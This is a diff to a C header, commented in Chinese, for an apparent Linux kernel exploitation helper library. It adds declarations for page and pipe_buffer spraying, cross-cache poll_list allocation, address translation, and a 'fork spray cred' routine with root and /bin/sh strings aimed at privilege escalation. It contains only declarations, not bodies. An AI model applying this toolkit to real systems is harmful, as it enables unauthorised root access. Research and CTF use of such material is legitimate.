@@ -43,7 +43,7 @@
  */
 
 // 一般环境最大 fds 是 1024，如果超出，修改 INITIAL_PAGE_SPRAY。
-#define INITIAL_PAGE_SPRAY 903
+#define INITIAL_PAGE_SPRAY 20
 #define PACKET_VERSION 10
 #define PACKET_TX_RING 13
 
@@ -62,7 +62,12 @@ enum tpacket_versions {
 
 extern int sprayfd_child[2];
 extern int sprayfd_parent[2];
-extern int socketfds[INITIAL_PAGE_SPRAY];
+extern int socketfds[10*INITIAL_PAGE_SPRAY];
+
+// #define PGV_ALLOC_ORDER_MASK 0x3c
+// #define PGV_ALLOC_ORDER_SHIFT 2
+// #define PGV_ALLOC_ORDER(x) (((x)&PGV_ALLOC_ORDER_MASK) >> PGV_ALLOC_ORDER_SHIFT)
+// #define PGV_ORDER_TO_REQUEST(x) ((x) << PGV_ALLOC_ORDER_SHIFT)
 
 enum spray_cmd {
     ALLOC_PAGE,
@@ -73,11 +78,12 @@ enum spray_cmd {
 typedef struct {
     enum spray_cmd cmd;
     int32_t idx;
+    uint32_t order;
 } ipc_req_t;
 
 void unshare_setup(uid_t uid, gid_t gid);
 
-void send_spray_cmd(enum spray_cmd cmd, int idx);
+void send_spray_cmd(enum spray_cmd cmd, int idx, uint32_t order);
 
 int alloc_pages_via_sock(uint32_t size, uint32_t n);
 
@@ -213,6 +219,10 @@ void *alloc_poll_list(void *args);
 
 void create_poll_thread(int id, size_t size, int timeout);
 
+void *alloc_poll_list_for_crosscache(void *args);
+
+void create_poll_thread_for_crosscache(int id, size_t size, int timeout);
+
 void join_poll_threads(void);
 
 void init_fd();
@@ -228,4 +238,42 @@ extern struct sockaddr_in socket_addr;
 extern struct msghdr *sendmsg_msgs;
 
 void sendmsg_init(uint64_t n, uint64_t spray_size, uint64_t offset, uint64_t userfault_handler);
+
+/**
+ * @brief pipe_buffer 相关
+ * 
+ */
+
+#define PIPE_SPRAY_NUM 0x60
+
+extern int pipefds[PIPE_SPRAY_NUM][2];
+
+void extend_pipe_buffer(int idx, size_t size);
+void spray_pipe();
+
+
+extern uint64_t virtual_base;
+extern uint64_t vmemmap_base;
+uint64_t page_to_virtual(uint64_t page);
+uint64_t page_to_physic(uint64_t page);
+
+/**
+ * @brief fork spray cred 相关
+ * 
+ */
+
+#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
+
+extern int rootfd[2];
+extern struct timespec timer;
+extern char throwaway;
+extern char root[];
+extern char binsh[];
+extern char *args[];
+
+__attribute__((naked)) pid_t __clone(uint64_t flags, void *dest);
+__attribute__((naked)) void check_and_wait();
+int just_wait();
+void fork_spray_cred_example();
+
 #endif
